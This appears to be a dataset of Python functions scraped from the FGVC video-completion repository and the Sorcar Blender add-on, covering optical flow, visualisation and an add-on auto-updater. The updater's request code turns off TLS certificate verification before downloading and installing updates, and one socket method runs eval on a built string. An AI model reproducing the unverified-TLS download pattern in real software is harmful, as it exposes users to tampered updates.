{"docstring": "\"\"\"Calculates optical flow.\n\"\"\"\n", "func_signal": "def calculate_flow(args, model, video, mode):\n", "code": "if mode not in ['forward', 'backward']:\n    raise NotImplementedError\n\nnFrame, _, imgH, imgW = video.shape\nFlow = np.empty(((imgH, imgW, 2, 0)), dtype=np.float32)\n\n# if os.path.isdir(os.path.join(args.outroot, 'flow', mode + '_flo')):\n#     for flow_name in sorted(glob.glob(os.path.join(args.outroot, 'flow', mode + '_flo', '*.flo'))):\n#         print(\"Loading {0}\".format(flow_name), '\\r', end='')\n#         flow = utils.frame_utils.readFlow(flow_name)\n#         Flow = np.concatenate((Flow, flow[..., None]), axis=-1)\n#     return Flow\n\ncreate_dir(os.path.join(args.outroot, 'flow', mode + '_flo'))\ncreate_dir(os.path.join(args.outroot, 'flow', mode + '_png'))\n\nwith torch.no_grad():\n    for i in range(video.shape[0] - 1):\n        print(\"Calculating {0} flow {1:2d} <---> {2:2d}\".format(mode, i, i + 1), '\\r', end='')\n        if mode == 'forward':\n            # Flow i -> i + 1\n            image1 = video[i, None]\n            image2 = video[i + 1, None]\n        elif mode == 'backward':\n            # Flow i + 1 -> i\n            image1 = video[i + 1, None]\n            image2 = video[i, None]\n        else:\n            raise NotImplementedError\n\n        _, flow = model(image1, image2, iters=20, test_mode=True)\n        flow = flow[0].permute(1, 2, 0).cpu().numpy()\n        Flow = np.concatenate((Flow, flow[..., None]), axis=-1)\n\n        # Flow visualization.\n        flow_img = utils.flow_viz.flow_to_image(flow)\n        flow_img = Image.fromarray(flow_img)\n\n        # Saves the flow and flow_img.\n        flow_img.save(os.path.join(args.outroot, 'flow', mode + '_png', '%05d.png'%i))\n        utils.frame_utils.writeFlow(os.path.join(args.outroot, 'flow', mode + '_flo', '%05d.flo'%i), flow)\n\nreturn Flow", "path": "FGVC/tool/video_completion.py", "commit_date": "2020-12-06 00:00:00", "repo_name": "vt-vl-lab/FGVC", "stars": 1531, "license": "other", "language": "python", "size": 97}
{"docstring": "\"\"\"\nApplies the flow color wheel to (possibly clipped) flow components u and v.\n\nAccording to the C++ source code of Daniel Scharstein\nAccording to the Matlab source code of Deqing Sun\n\nArgs:\n    u (np.ndarray): Input horizontal flow of shape [H,W]\n    v (np.ndarray): Input vertical flow of shape [H,W]\n    convert_to_bgr (bool, optional): Convert output image to BGR. Defaults to False.\n\nReturns:\n    np.ndarray: Flow visualization image of shape [H,W,3]\n\"\"\"\n", "func_signal": "def flow_uv_to_colors(u, v, convert_to_bgr=False):\n", "code": "flow_image = np.zeros((u.shape[0], u.shape[1], 3), np.uint8)\ncolorwheel = make_colorwheel()  # shape [55x3]\nncols = colorwheel.shape[0]\nrad = np.sqrt(np.square(u) + np.square(v))\na = np.arctan2(-v, -u)/np.pi\nfk = (a+1) / 2*(ncols-1)\nk0 = np.floor(fk).astype(np.int32)\nk1 = k0 + 1\nk1[k1 == ncols] = 0\nf = fk - k0\nfor i in range(colorwheel.shape[1]):\n    tmp = colorwheel[:,i]\n    col0 = tmp[k0] / 255.0\n    col1 = tmp[k1] / 255.0\n    col = (1-f)*col0 + f*col1\n    idx = (rad <= 1)\n    col[idx]  = 1 - rad[idx] * (1-col[idx])\n    col[~idx] = col[~idx] * 0.75   # out of range\n    # Note the 2-i => BGR instead of RGB\n    ch_idx = 2-i if convert_to_bgr else i\n    flow_image[:,:,ch_idx] = np.floor(255 * col)\nreturn flow_image", "path": "FGVC/RAFT/utils/flow_viz.py", "commit_date": "2020-09-21 00:00:00", "repo_name": "vt-vl-lab/FGVC", "stars": 1531, "license": "other", "language": "python", "size": 97}
{"docstring": "\"\"\"Completes flow.\n\"\"\"\n", "func_signal": "def complete_flow(args, corrFlow, flow_mask, mode, edge=None):\n", "code": "if mode not in ['forward', 'backward']:\n    raise NotImplementedError\n\nimgH, imgW, _, nFrame = corrFlow.shape\n\n# if os.path.isdir(os.path.join(args.outroot, 'flow_comp', mode + '_flo')):\n#     compFlow = np.empty(((imgH, imgW, 2, 0)), dtype=np.float32)\n#     for flow_name in sorted(glob.glob(os.path.join(args.outroot, 'flow_comp', mode + '_flo', '*.flo'))):\n#         print(\"Loading {0}\".format(flow_name), '\\r', end='')\n#         flow = utils.frame_utils.readFlow(flow_name)\n#         compFlow = np.concatenate((compFlow, flow[..., None]), axis=-1)\n#     return compFlow\n\ncreate_dir(os.path.join(args.outroot, 'flow_comp', mode + '_flo'))\ncreate_dir(os.path.join(args.outroot, 'flow_comp', mode + '_png'))\n\ncompFlow = np.zeros(((imgH, imgW, 2, nFrame)), dtype=np.float32)\n\nfor i in range(nFrame):\n    print(\"Completing {0} flow {1:2d} <---> {2:2d}\".format(mode, i, i + 1), '\\r', end='')\n    flow = corrFlow[:, :, :, i]\n    flow_mask_img = flow_mask[:, :, i] if mode == 'forward' else flow_mask[:, :, i + 1]\n    flow_mask_gradient_img = gradient_mask(flow_mask_img)\n\n    if edge is not None:\n        # imgH x (imgW - 1 + 1) x 2\n        gradient_x = np.concatenate((np.diff(flow, axis=1), np.zeros((imgH, 1, 2), dtype=np.float32)), axis=1)\n        # (imgH - 1 + 1) x imgW x 2\n        gradient_y = np.concatenate((np.diff(flow, axis=0), np.zeros((1, imgW, 2), dtype=np.float32)), axis=0)\n\n        # concatenate gradient_x and gradient_y\n        gradient = np.concatenate((gradient_x, gradient_y), axis=2)\n\n        # We can trust the gradient outside of flow_mask_gradient_img\n        # We assume the gradient within flow_mask_gradient_img is 0.\n        gradient[flow_mask_gradient_img, :] = 0\n\n        # Complete the flow\n        imgSrc_gy = gradient[:, :, 2 : 4]\n        imgSrc_gy = imgSrc_gy[0 : imgH - 1, :, :]\n        imgSrc_gx = gradient[:, :, 0 : 2]\n        imgSrc_gx = imgSrc_gx[:, 0 : imgW - 1, :]\n        compFlow[:, :, :, i] = Poisson_blend(flow, imgSrc_gx, imgSrc_gy, flow_mask_img, edge[:, :, i])\n\n    else:\n        flow[:, :, 0] = rf.regionfill(flow[:, :, 0], flow_mask_img)\n        flow[:, :, 1] = rf.regionfill(flow[:, :, 1], flow_mask_img)\n        compFlow[:, :, :, i] = flow\n\n    # Flow visualization.\n    flow_img = utils.flow_viz.flow_to_image(compFlow[:, :, :, i])\n    flow_img = Image.fromarray(flow_img)\n\n    # Saves the flow and flow_img.\n    flow_img.save(os.path.join(args.outroot, 'flow_comp', mode + '_png', '%05d.png'%i))\n    utils.frame_utils.writeFlow(os.path.join(args.outroot, 'flow_comp', mode + '_flo', '%05d.flo'%i), compFlow[:, :, :, i])\n\nreturn compFlow", "path": "FGVC/tool/video_completion.py", "commit_date": "2020-12-06 00:00:00", "repo_name": "vt-vl-lab/FGVC", "stars": 1531, "license": "other", "language": "python", "size": 97}
{"docstring": "\"\"\"\nGenerate color wheel according Middlebury color code\n:return: Color wheel\n\"\"\"\n", "func_signal": "def make_color_wheel(self):\n", "code": "RY = 15\nYG = 6\nGC = 4\nCB = 11\nBM = 13\nMR = 6\n\nncols = RY + YG + GC + CB + BM + MR\n\ncolorwheel = np.zeros([ncols, 3])\n\ncol = 0\n\n# RY\ncolorwheel[0:RY, 0] = 255\ncolorwheel[0:RY, 1] = np.transpose(np.floor(255*np.arange(0, RY) / RY))\ncol += RY\n\n# YG\ncolorwheel[col:col+YG, 0] = 255 - np.transpose(np.floor(255*np.arange(0, YG) / YG))\ncolorwheel[col:col+YG, 1] = 255\ncol += YG\n\n# GC\ncolorwheel[col:col+GC, 1] = 255\ncolorwheel[col:col+GC, 2] = np.transpose(np.floor(255*np.arange(0, GC) / GC))\ncol += GC\n\n# CB\ncolorwheel[col:col+CB, 1] = 255 - np.transpose(np.floor(255*np.arange(0, CB) / CB))\ncolorwheel[col:col+CB, 2] = 255\ncol += CB\n\n# BM\ncolorwheel[col:col+BM, 2] = 255\ncolorwheel[col:col+BM, 0] = np.transpose(np.floor(255*np.arange(0, BM) / BM))\ncol += + BM\n\n# MR\ncolorwheel[col:col+MR, 2] = 255 - np.transpose(np.floor(255 * np.arange(0, MR) / MR))\ncolorwheel[col:col+MR, 0] = 255\n\nreturn colorwheel", "path": "FGVC/edgeconnect/dataset.py", "commit_date": "2020-09-21 00:00:00", "repo_name": "vt-vl-lab/FGVC", "stars": 1531, "license": "other", "language": "python", "size": 97}
{"docstring": "\"\"\"Initializes the RAFT model.\n\"\"\"\n", "func_signal": "def initialize_RAFT(args):\n", "code": "model = torch.nn.DataParallel(RAFT(args))\nmodel.load_state_dict(torch.load(args.model))\n\nmodel = model.module\nmodel.to('cuda')\nmodel.eval()\n\nreturn model", "path": "FGVC/tool/video_completion.py", "commit_date": "2020-12-06 00:00:00", "repo_name": "vt-vl-lab/FGVC", "stars": 1531, "license": "other", "language": "python", "size": 97}
{"docstring": "# Compute features\n", "func_signal": "def __call__(self, x, y):\n", "code": "x_vgg, y_vgg = self.vgg(x), self.vgg(y)\n\ncontent_loss = 0.0\ncontent_loss += self.weights[0] * self.criterion(x_vgg['relu1_1'], y_vgg['relu1_1'])\ncontent_loss += self.weights[1] * self.criterion(x_vgg['relu2_1'], y_vgg['relu2_1'])\ncontent_loss += self.weights[2] * self.criterion(x_vgg['relu3_1'], y_vgg['relu3_1'])\ncontent_loss += self.weights[3] * self.criterion(x_vgg['relu4_1'], y_vgg['relu4_1'])\ncontent_loss += self.weights[4] * self.criterion(x_vgg['relu5_1'], y_vgg['relu5_1'])\n\n\nreturn content_loss", "path": "FGVC/edgeconnect/loss.py", "commit_date": "2020-09-21 00:00:00", "repo_name": "vt-vl-lab/FGVC", "stars": 1531, "license": "other", "language": "python", "size": 97}
{"docstring": "# spatial augmentation params\n", "func_signal": "def __init__(self, crop_size, min_scale=-0.2, max_scale=0.5, do_flip=False):\n", "code": "self.crop_size = crop_size\nself.min_scale = min_scale\nself.max_scale = max_scale\nself.spatial_aug_prob = 0.8\nself.stretch_prob = 0.8\nself.max_stretch = 0.2\n\n# flip augmentation params\nself.do_flip = do_flip\nself.h_flip_prob = 0.5\nself.v_flip_prob = 0.1\n\n# photometric augmentation params\nself.photo_aug = ColorJitter(brightness=0.3, contrast=0.3, saturation=0.3, hue=0.3/3.14)\nself.asymmetric_color_aug_prob = 0.2\nself.eraser_aug_prob = 0.5", "path": "FGVC/RAFT/utils/augmentor.py", "commit_date": "2020-09-21 00:00:00", "repo_name": "vt-vl-lab/FGVC", "stars": 1531, "license": "other", "language": "python", "size": 97}
{"docstring": "\"\"\"\nExpects a two dimensional flow image of shape.\n\nArgs:\n    flow_uv (np.ndarray): Flow UV image of shape [H,W,2]\n    clip_flow (float, optional): Clip maximum of flow values. Defaults to None.\n    convert_to_bgr (bool, optional): Convert output image to BGR. Defaults to False.\n\nReturns:\n    np.ndarray: Flow visualization image of shape [H,W,3]\n\"\"\"\n", "func_signal": "def flow_to_image(flow_uv, clip_flow=None, convert_to_bgr=False):\n", "code": "assert flow_uv.ndim == 3, 'input flow must have three dimensions'\nassert flow_uv.shape[2] == 2, 'input flow must have shape [H,W,2]'\nif clip_flow is not None:\n    flow_uv = np.clip(flow_uv, 0, clip_flow)\nu = flow_uv[:,:,0]\nv = flow_uv[:,:,1]\nrad = np.sqrt(np.square(u) + np.square(v))\nrad_max = np.max(rad)\nepsilon = 1e-5\nu = u / (rad_max + epsilon)\nv = v / (rad_max + epsilon)\nreturn flow_uv_to_colors(u, v, convert_to_bgr)", "path": "FGVC/RAFT/utils/flow_viz.py", "commit_date": "2020-09-21 00:00:00", "repo_name": "vt-vl-lab/FGVC", "stars": 1531, "license": "other", "language": "python", "size": 97}
{"docstring": "\"\"\" Photometric augmentation \"\"\"\n\n# asymmetric\n", "func_signal": "def color_transform(self, img1, img2):\n", "code": "if np.random.rand() < self.asymmetric_color_aug_prob:\n    img1 = np.array(self.photo_aug(Image.fromarray(img1)), dtype=np.uint8)\n    img2 = np.array(self.photo_aug(Image.fromarray(img2)), dtype=np.uint8)\n\n# symmetric\nelse:\n    image_stack = np.concatenate([img1, img2], axis=0)\n    image_stack = np.array(self.photo_aug(Image.fromarray(image_stack)), dtype=np.uint8)\n    img1, img2 = np.split(image_stack, 2, axis=0)\n\nreturn img1, img2", "path": "FGVC/RAFT/utils/augmentor.py", "commit_date": "2020-09-21 00:00:00", "repo_name": "vt-vl-lab/FGVC", "stars": 1531, "license": "other", "language": "python", "size": 97}
{"docstring": "# Could clash with tag names and if it does, it will\n# download TAG zip instead of branch zip to get\n# direct path, would need.\n", "func_signal": "def form_branch_url(self, branch, updater):\n", "code": "return \"{}{}{}\".format(\n\tself.form_repo_url(updater),\n\t\"/repository/archive.zip?sha=\",\n\tbranch)", "path": "Sorcar/addon_updater.py", "commit_date": "2019-12-11 00:00:00", "repo_name": "aachman98/Sorcar", "stars": 1150, "license": "gpl-3.0", "language": "python", "size": 12404}
{"docstring": "\"\"\"Assign the tag name and url to update to\"\"\"\n", "func_signal": "def set_tag(self, name):\n", "code": "tg = None\nfor tag in self._tags:\n\tif name == tag[\"name\"]:\n\t\ttg = tag\n\t\tbreak\nif tg:\n\tnew_version = self.version_tuple_from_text(self.tag_latest)\n\tself._update_version = new_version\n\tself._update_link = self.select_link(self, tg)\nelif self._include_branches and name in self._include_branch_list:\n\t# scenario if reverting to a specific branch name instead of tag\n\ttg = name\n\tlink = self.form_branch_url(tg)\n\tself._update_version = name  # this will break things\n\tself._update_link = link\nif not tg:\n\traise ValueError(\"Version tag not found: \"+name)", "path": "Sorcar/addon_updater.py", "commit_date": "2019-12-11 00:00:00", "repo_name": "aachman98/Sorcar", "stars": 1150, "license": "gpl-3.0", "language": "python", "size": 12404}
{"docstring": "# print(\"Raw request:\", url)\n", "func_signal": "def get_raw(self, url):\n", "code": "request = urllib.request.Request(url)\ntry:\n\tcontext = ssl._create_unverified_context()\nexcept:\n\t# some blender packaged python versions don't have this, largely\n\t# useful for local network setups otherwise minimal impact\n\tcontext = None\n\n# setup private request headers if appropriate\nif self._engine.token != None:\n\tif self._engine.name == \"gitlab\":\n\t\trequest.add_header('PRIVATE-TOKEN',self._engine.token)\n\telse:\n\t\tif self._verbose: print(\"Tokens not setup for engine yet\")\n\n# run the request\ntry:\n\tif context:\n\t\tresult = urllib.request.urlopen(request, context=context)\n\telse:\n\t\tresult = urllib.request.urlopen(request)\nexcept urllib.error.HTTPError as e:\n\tif str(e.code) == \"403\":\n\t\tself._error = \"HTTP error (access denied)\"\n\t\tself._error_msg = str(e.code) + \" - server error response\"\n\t\tprint(self._error, self._error_msg)\n\telse:\n\t\tself._error = \"HTTP error\"\n\t\tself._error_msg = str(e.code)\n\t\tprint(self._error, self._error_msg)\n\tself._update_ready = None\nexcept urllib.error.URLError as e:\n\treason = str(e.reason)\n\tif \"TLSV1_ALERT\" in reason or \"SSL\" in reason.upper():\n\t\tself._error = \"Connection rejected, download manually\"\n\t\tself._error_msg = reason\n\t\tprint(self._error, self._error_msg)\n\telse:\n\t\tself._error = \"URL error, check internet connection\"\n\t\tself._error_msg = reason\n\t\tprint(self._error, self._error_msg)\n\tself._update_ready = None\n\treturn None\nelse:\n\tresult_string = result.read()\n\tresult.close()\n\treturn result_string.decode()", "path": "Sorcar/addon_updater.py", "commit_date": "2019-12-11 00:00:00", "repo_name": "aachman98/Sorcar", "stars": 1150, "license": "gpl-3.0", "language": "python", "size": 12404}
{"docstring": "# ensure it is a function assignment, with signature:\n# input self, tag; returns link name\n", "func_signal": "def select_link(self, value):\n", "code": "if not hasattr(value, \"__call__\"):\n\traise ValueError(\"select_link must be a function\")\nself._select_link = value", "path": "Sorcar/addon_updater.py", "commit_date": "2019-12-11 00:00:00", "repo_name": "aachman98/Sorcar", "stars": 1150, "license": "gpl-3.0", "language": "python", "size": 12404}
{"docstring": "\"\"\"Method to give impression of stopping check for update.\n\nCurrently does nothing but allows user to retry/stop blocking UI from\nhitting a refresh button. This does not actually stop the thread, as it\nwill complete after the connection timeout regardless. If the thread\ndoes complete with a successful response, this will be still displayed\non next UI refresh (ie no update, or update available).\n\"\"\"\n", "func_signal": "def stop_async_check_update(self):\n", "code": "if self._check_thread != None:\n\tif self._verbose: print(\"Thread will end in normal course.\")\n\t# however, \"There is no direct kill method on a thread object.\"\n\t# better to let it run its course\n\t#self._check_thread.stop()\nself._async_checking = False\nself._error = None\nself._error_msg = None", "path": "Sorcar/addon_updater.py", "commit_date": "2019-12-11 00:00:00", "repo_name": "aachman98/Sorcar", "stars": 1150, "license": "gpl-3.0", "language": "python", "size": 12404}
{"docstring": "# first save the state\n", "func_signal": "def save_updater_json(self):\n", "code": "if self._update_ready == True:\n\tif type(self._update_version) == type((0,0,0)):\n\t\tself._json[\"update_ready\"] = True\n\t\tself._json[\"version_text\"][\"link\"]=self._update_link\n\t\tself._json[\"version_text\"][\"version\"]=self._update_version\n\telse:\n\t\tself._json[\"update_ready\"] = False\n\t\tself._json[\"version_text\"] = {}\nelse:\n\tself._json[\"update_ready\"] = False\n\tself._json[\"version_text\"] = {}\n\njpath = self.get_json_path()\noutf = open(jpath,'w')\ndata_out = json.dumps(self._json, indent=4)\noutf.write(data_out)\noutf.close()\nif self._verbose:\n\tprint(self._addon+\": Wrote out updater JSON settings to file, with the contents:\")\n\tprint(self._json)", "path": "Sorcar/addon_updater.py", "commit_date": "2019-12-11 00:00:00", "repo_name": "aachman98/Sorcar", "stars": 1150, "license": "gpl-3.0", "language": "python", "size": 12404}
{"docstring": "\"\"\"Runs an install, update, or reversion of an addon from online source\n\nArguments:\n\tforce: Install assigned link, even if self.update_ready is False\n\trevert_tag: Version to install, if none uses detected update link\n\tclean: not used, but in future could use to totally refresh addon\n\tcallback: used to run function on update completion\n\"\"\"\n", "func_signal": "def run_update(self,force=False,revert_tag=None,clean=False,callback=None):\n", "code": "self._json[\"update_ready\"] = False\nself._json[\"ignore\"] = False  # clear ignore flag\nself._json[\"version_text\"] = {}\n\nif revert_tag != None:\n\tself.set_tag(revert_tag)\n\tself._update_ready = True\n\n# clear the errors if any\nself._error = None\nself._error_msg = None\n\nif self._verbose: print(\"Running update\")\n\nif self._fake_install == True:\n\t# change to True, to trigger the reload/\"update installed\" handler\n\tif self._verbose:\n\t\tprint(\"fake_install=True\")\n\t\tprint(\"Just reloading and running any handler triggers\")\n\tself._json[\"just_updated\"] = True\n\tself.save_updater_json()\n\tif self._backup_current == True:\n\t\tself.create_backup()\n\tself.reload_addon()\n\tself._update_ready = False\n\tres = True  # fake \"success\" zip download flag\n\nelif force==False:\n\tif self._update_ready != True:\n\t\tif self._verbose:\n\t\t\tprint(\"Update stopped, new version not ready\")\n\t\tif callback:\n\t\t\tcallback(\n\t\t\t\tself._addon_package,\n\t\t\t\t\"Update stopped, new version not ready\")\n\t\treturn \"Update stopped, new version not ready\"\n\telif self._update_link == None:\n\t\t# this shouldn't happen if update is ready\n\t\tif self._verbose:\n\t\t\tprint(\"Update stopped, update link unavailable\")\n\t\tif callback:\n\t\t\tcallback(\n\t\t\t\tself._addon_package,\n\t\t\t\t\"Update stopped, update link unavailable\")\n\t\treturn \"Update stopped, update link unavailable\"\n\n\tif self._verbose and revert_tag==None:\n\t\tprint(\"Staging update\")\n\telif self._verbose:\n\t\tprint(\"Staging install\")\n\n\tres = self.stage_repository(self._update_link)\n\tif res !=True:\n\t\tprint(\"Error in staging repository: \"+str(res))\n\t\tif callback != None:\n\t\t\tcallback(self._addon_package, self._error_msg)\n\t\treturn self._error_msg\n\tres = self.unpack_staged_zip(clean)\n\tif res<0:\n\t\tif callback:\n\t\t\tcallback(self._addon_package, self._error_msg)\n\t\treturn res\n\nelse:\n\tif self._update_link == None:\n\t\tif self._verbose:\n\t\t\tprint(\"Update stopped, could not get link\")\n\t\treturn \"Update stopped, could not get link\"\n\tif self._verbose:\n\t\tprint(\"Forcing update\")\n\n\tres = self.stage_repository(self._update_link)\n\tif res !=True:\n\t\tprint(\"Error in staging repository: \"+str(res))\n\t\tif callback:\n\t\t\tcallback(self._addon_package, self._error_msg)\n\t\treturn self._error_msg\n\tres = self.unpack_staged_zip(clean)\n\tif res<0:\n\t\treturn res\n\t# would need to compare against other versions held in tags\n\n# run the front-end's callback if provided\nif callback:\n\tcallback(self._addon_package)\n\n# return something meaningful, 0 means it worked\nreturn 0", "path": "Sorcar/addon_updater.py", "commit_date": "2019-12-11 00:00:00", "repo_name": "aachman98/Sorcar", "stars": 1150, "license": "gpl-3.0", "language": "python", "size": 12404}
{"docstring": "\"\"\"Returns the full path to the JSON state file used by this updater.\n\nWill also rename old file paths to addon-specific path if found\n\"\"\"\n", "func_signal": "def get_json_path(self):\n", "code": "json_path = os.path.join(self._updater_path,\n\t\"{}_updater_status.json\".format(self._addon_package))\nold_json_path = os.path.join(self._updater_path, \"updater_status.json\")\n\n# rename old file if it exists\ntry:\n\tos.rename(old_json_path, json_path)\nexcept FileNotFoundError:\n\tpass\nexcept Exception as err:\n\tprint(\"Other OS error occurred while trying to rename old JSON\")\n\tprint(err)\nreturn json_path", "path": "Sorcar/addon_updater.py", "commit_date": "2019-12-11 00:00:00", "repo_name": "aachman98/Sorcar", "stars": 1150, "license": "gpl-3.0", "language": "python", "size": 12404}
{"docstring": "\"\"\"Merge folder 'merger' into folder 'base' without deleting existing\"\"\"\n", "func_signal": "def deepMergeDirectory(self,base,merger,clean=False):\n", "code": "if not os.path.exists(base):\n\tif self._verbose:\n\t\tprint(\"Base path does not exist:\", base)\n\treturn -1\nelif not os.path.exists(merger):\n\tif self._verbose:\n\t\tprint(\"Merger path does not exist\")\n\treturn -1\n\n# paths to be aware of and not overwrite/remove/etc\nstaging_path = os.path.join(self._updater_path,\"update_staging\")\nbackup_path = os.path.join(self._updater_path,\"backup\")\n\n# If clean install is enabled, clear existing files ahead of time\n# note: will not delete the update.json, update folder, staging, or staging\n# but will delete all other folders/files in addon directory\nerror = None\nif clean==True:\n\ttry:\n\t\t# implement clearing of all folders/files, except the\n\t\t# updater folder and updater json\n\t\t# Careful, this deletes entire subdirectories recursively...\n\t\t# make sure that base is not a high level shared folder, but\n\t\t# is dedicated just to the addon itself\n\t\tif self._verbose: print(\"clean=True, clearing addon folder to fresh install state\")\n\n\t\t# remove root files and folders (except update folder)\n\t\tfiles = [f for f in os.listdir(base) if os.path.isfile(os.path.join(base,f))]\n\t\tfolders = [f for f in os.listdir(base) if os.path.isdir(os.path.join(base,f))]\n\n\t\tfor f in files:\n\t\t\tos.remove(os.path.join(base,f))\n\t\t\tprint(\"Clean removing file {}\".format(os.path.join(base,f)))\n\t\tfor f in folders:\n\t\t\tif os.path.join(base,f)==self._updater_path: continue\n\t\t\tshutil.rmtree(os.path.join(base,f))\n\t\t\tprint(\"Clean removing folder and contents {}\".format(os.path.join(base,f)))\n\n\texcept Exception as err:\n\t\terror = \"failed to create clean existing addon folder\"\n\t\tprint(error, str(err))\n\n# Walk through the base addon folder for rules on pre-removing\n# but avoid removing/altering backup and updater file\nfor path, dirs, files in os.walk(base):\n\t# prune ie skip updater folder\n\tdirs[:] = [d for d in dirs if os.path.join(path,d) not in [self._updater_path]]\n\tfor file in files:\n\t\tfor ptrn in self.remove_pre_update_patterns:\n\t\t\tif fnmatch.filter([file],ptrn):\n\t\t\t\ttry:\n\t\t\t\t\tfl = os.path.join(path,file)\n\t\t\t\t\tos.remove(fl)\n\t\t\t\t\tif self._verbose: print(\"Pre-removed file \"+file)\n\t\t\t\texcept OSError:\n\t\t\t\t\tprint(\"Failed to pre-remove \"+file)\n\n# Walk through the temp addon sub folder for replacements\n# this implements the overwrite rules, which apply after\n# the above pre-removal rules. This also performs the\n# actual file copying/replacements\nfor path, dirs, files in os.walk(merger):\n\t# verify this structure works to prune updater sub folder overwriting\n\tdirs[:] = [d for d in dirs if os.path.join(path,d) not in [self._updater_path]]\n\trelPath = os.path.relpath(path, merger)\n\tdestPath = os.path.join(base, relPath)\n\tif not os.path.exists(destPath):\n\t\tos.makedirs(destPath)\n\tfor file in files:\n\t\t# bring in additional logic around copying/replacing\n\t\t# Blender default: overwrite .py's, don't overwrite the rest\n\t\tdestFile = os.path.join(destPath, file)\n\t\tsrcFile = os.path.join(path, file)\n\n\t\t# decide whether to replace if file already exists, and copy new over\n\t\tif os.path.isfile(destFile):\n\t\t\t# otherwise, check each file to see if matches an overwrite pattern\n\t\t\treplaced=False\n\t\t\tfor ptrn in self._overwrite_patterns:\n\t\t\t\tif fnmatch.filter([destFile],ptrn):\n\t\t\t\t\treplaced=True\n\t\t\t\t\tbreak\n\t\t\tif replaced:\n\t\t\t\tos.remove(destFile)\n\t\t\t\tos.rename(srcFile, destFile)\n\t\t\t\tif self._verbose: print(\"Overwrote file \"+os.path.basename(destFile))\n\t\t\telse:\n\t\t\t\tif self._verbose: print(\"Pattern not matched to \"+os.path.basename(destFile)+\", not overwritten\")\n\t\telse:\n\t\t\t# file did not previously exist, simply move it over\n\t\t\tos.rename(srcFile, destFile)\n\t\t\tif self._verbose: print(\"New file \"+os.path.basename(destFile))\n\n# now remove the temp staging folder and downloaded zip\ntry:\n\tshutil.rmtree(staging_path)\nexcept:\n\terror = \"Error: Failed to remove existing staging directory, consider manually removing \"+staging_path\n\tif self._verbose: print(error)", "path": "Sorcar/addon_updater.py", "commit_date": "2019-12-11 00:00:00", "repo_name": "aachman98/Sorcar", "stars": 1150, "license": "gpl-3.0", "language": "python", "size": 12404}
{"docstring": "# Initialise node socket values\n", "func_signal": "def init(self, default_prop=\"\", visible=False):\n", "code": "self.default_prop = default_prop\nif not (self.is_output or default_prop == \"\"):\n    self.hide = not visible", "path": "Sorcar/sockets/_base/socket_base.py", "commit_date": "2020-06-06 00:00:00", "repo_name": "aachman98/Sorcar", "stars": 1150, "license": "gpl-3.0", "language": "python", "size": 12404}
{"docstring": "# Execute node socket to get/set default_value\n", "func_signal": "def execute(self, forced):\n", "code": "if (self.is_output):\n    if (self.node.type == \"GROUP_INPUT\"):\n        return True\n    return self.node.execute(forced)\nelse:\n    self.socket_error = True\n    # if (len(self.links) > 0):\n    if (self.is_linked): # self.is_linked doesn't get updated quickly (when using realtime update & modify links)\n        from_node = self.links[0].from_node\n        from_socket = self.links[0].from_socket\n        while (from_node.bl_idname == \"NodeReroute\"):\n            if (not from_node.inputs[0].is_linked):\n                from_socket = None\n                break\n            from_socket = from_node.inputs[0].links[0].from_socket\n            from_node = from_node.inputs[0].links[0].from_node\n        if (from_socket and from_socket.execute(forced)):\n            ret, data = from_socket.get_data(self.default_type)\n            if(ret):\n                self.socket_error = False\n                return self.set(data)\n            else:\n                print_log(self.node.name, self.name, \"execute\", msg=\"No ret\")\n    else:\n        if (self.default_prop == \"\"):\n            if (self.node.bl_idname == \"ScNodeGroup\" and [i for i in self.node.node_tree.inputs if i.identifier==self.identifier][0].show_prop):\n                self.socket_error = False\n                self.default_value = self.default_value_update\n                return True\n            return False\n        self.socket_error = False\n        return self.set(eval(\"bpy.data.node_groups['\" + self.id_data.name + \"'].nodes['\" + self.node.name + \"'].\" + self.default_prop))\n    return False", "path": "Sorcar/sockets/_base/socket_base.py", "commit_date": "2020-06-06 00:00:00", "repo_name": "aachman98/Sorcar", "stars": 1150, "license": "gpl-3.0", "language": "python", "size": 12404}
{"docstring": "# return the json version\n", "func_signal": "def get_api(self, url):\n", "code": "get = None\nget = self.get_raw(url)\nif get != None:\n\ttry:\n\t\treturn json.JSONDecoder().decode(get)\n\texcept Exception as e:\n\t\tself._error = \"API response has invalid JSON format\"\n\t\tself._error_msg = str(e.reason)\n\t\tself._update_ready = None\n\t\tprint(self._error, self._error_msg)\n\t\treturn None\nelse:\n\treturn None", "path": "Sorcar/addon_updater.py", "commit_date": "2019-12-11 00:00:00", "repo_name": "aachman98/Sorcar", "stars": 1150, "license": "gpl-3.0", "language": "python", "size": 12404}
{"docstring": "\"\"\"Start a background thread which will check for updates\"\"\"\n", "func_signal": "def start_async_check_update(self, now=False, callback=None):\n", "code": "if self._async_checking is True:\n\treturn\nif self._verbose:\n\tprint(\"{} updater: Starting background checking thread\".format(\n\t\tself._addon))\ncheck_thread = threading.Thread(target=self.async_check_update,\n\t\t\t\t\t\t\t\targs=(now,callback,))\ncheck_thread.daemon = True\nself._check_thread = check_thread\ncheck_thread.start()", "path": "Sorcar/addon_updater.py", "commit_date": "2019-12-11 00:00:00", "repo_name": "aachman98/Sorcar", "stars": 1150, "license": "gpl-3.0", "language": "python", "size": 12404}
{"docstring": "# Get space, path, current nodetree, selected nodes (except group input/output) and a newly created group\n", "func_signal": "def execute(self, context):\n", "code": "space = context.space_data\npath = space.path\nnode_tree = space.path[-1].node_tree\nnode_group = bpy.data.node_groups.new(\"ScNodeGroup\", \"ScNodeTree\")\nselected_nodes = []\nfor n in node_tree.nodes:\n    if n.select:\n        if n.bl_idname in ['NodeGroupInput', 'NodeGroupOutput']:\n            n.select = False\n        else:\n            selected_nodes.append(n)\nnodes_len = len(selected_nodes)\n\n# Store all links (internal/external) for the selected nodes to be created as group inputs/outputs\nlinks_external_in = []\nlinks_external_out = []\nfor n in selected_nodes:\n    for i in n.inputs:\n        if (i.is_linked):\n            l = i.links[0]\n            if (not l.from_node in selected_nodes):\n                if (not l in links_external_in):\n                    links_external_in.append(l)\n    for o in n.outputs:\n        if (o.is_linked):\n            for l in o.links:\n                if (not l.to_node in selected_nodes):\n                    if (not l in links_external_out):\n                        links_external_out.append(l)\n\n# Calculate the required locations for placement of grouped node and input/output nodes\nloc_x_in = 0\nloc_x_out = 0\nloc_avg = Vector((0, 0))\nfor n in selected_nodes:\n    loc_avg += n.location/nodes_len\n    if (n.location[0] < loc_x_in):\n        loc_x_in = n.location[0]\n    if (n.location[0] > loc_x_out):\n        loc_x_out = n.location[0]\n\n# Create and relocate group input & output nodes in the newly created group\ngroup_input = node_group.nodes.new(\"NodeGroupInput\")\ngroup_output = 